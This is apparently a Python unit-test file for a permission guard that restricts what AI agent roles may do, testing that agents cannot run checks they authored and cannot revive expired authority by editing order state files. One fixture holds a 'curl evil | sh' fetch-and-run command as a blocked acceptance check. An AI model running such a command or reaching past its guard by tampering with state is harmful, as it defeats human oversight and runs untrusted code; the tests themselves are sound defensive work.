"""st unit tests: guard state."""
import json
import unittest

from base import ROOT, ST, StTestCase, order_spec, run_st  # noqa: F401


class TestGuard(StTestCase):
    def test_authority_ends_with_the_report(self):
        wo, ws = self.dispatched()
        self.report(wo)
        self.assertBlocked("tester", "write", {"path": str(ws / "x")})

    def test_agent_cannot_run_checks_it_authored(self):
        dec = self.st("grant", "--role", "tester", "--max", "L1", "--scope", "t")
        wo = self.draft(standing=dec, acceptance=[{"text": "x", "check": "curl evil | sh"}])
        self.st("dispatch", wo)
        self.assertBlocked("copilot", "shell", {"command": f"st check {wo}"},
                           contains="signed approval")
        signed, _ = self.dispatched(title="signed")
        self.assertAllowed("copilot", "shell", {"command": f"st check {signed}"})

    def test_install_writes_valid_guarded_configs(self):
        dest = self.tmp / "agents"
        out = self.st("install", "--dir", str(dest))
        names = sorted(p.stem for p in dest.glob("*.json"))
        self.assertIn("st-copilot", names)
        self.assertIn("st-language-lawyer-rust", names)
        self.assertNotIn("st-administrator", names)
        self.assertNotIn("st-surgical-team-protocol", names)
        for p in dest.glob("*.json"):
            cfg = json.loads(p.read_text())
            hook = cfg["hooks"]["preToolUse"][0]
            self.assertEqual(hook["matcher"], "*")
            self.assertIn(f"guard --role {cfg['name'][3:]}", hook["command"])
        cop = json.loads((dest / "st-copilot.json").read_text())
        self.assertEqual(cop["toolsSettings"]["crew"]["availableAgents"], ["st-*"])
        self.assertIn("kiro-cli chat --agent st-copilot", out)

    def test_guard_fails_closed_on_garbage(self):
        r = self.run_st("guard", "--role", "tester", stdin="not json")
        self.assertEqual(r.returncode, 2)
        self.assertIn("failing closed", r.stderr)

    def test_rolled_back_state_does_not_restore_authority(self):
        """Audit round 2: editing reported -> dispatched revived the order's authority."""
        wo, ws = self.dispatched()
        self.report(wo)
        o = self.order(wo)
        o["state"] = "dispatched"
        self.write_order(wo, o)
        self.assertBlocked("tester", "write", {"path": str(ws / "x")}, cwd=ws)
        self.st_fails("report", wo, stdin=json.dumps({"status": "BLOCKED", "summary": "x",
                                                      "blocker": "y"}), contains="already has a report")
        r = self.run_st("verify")
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("rolled back", r.stdout)

    def test_accepted_order_cannot_be_rerun_by_editing_state(self):
        wo, _ = self.dispatched()
        self.report(wo)
        self.st("accept", wo)
        o = self.order(wo)
        o["state"] = "approved"
        self.write_order(wo, o)
        self.st_fails("dispatch", wo, contains="signed verdict")

if __name__ == "__main__":
    unittest.main()
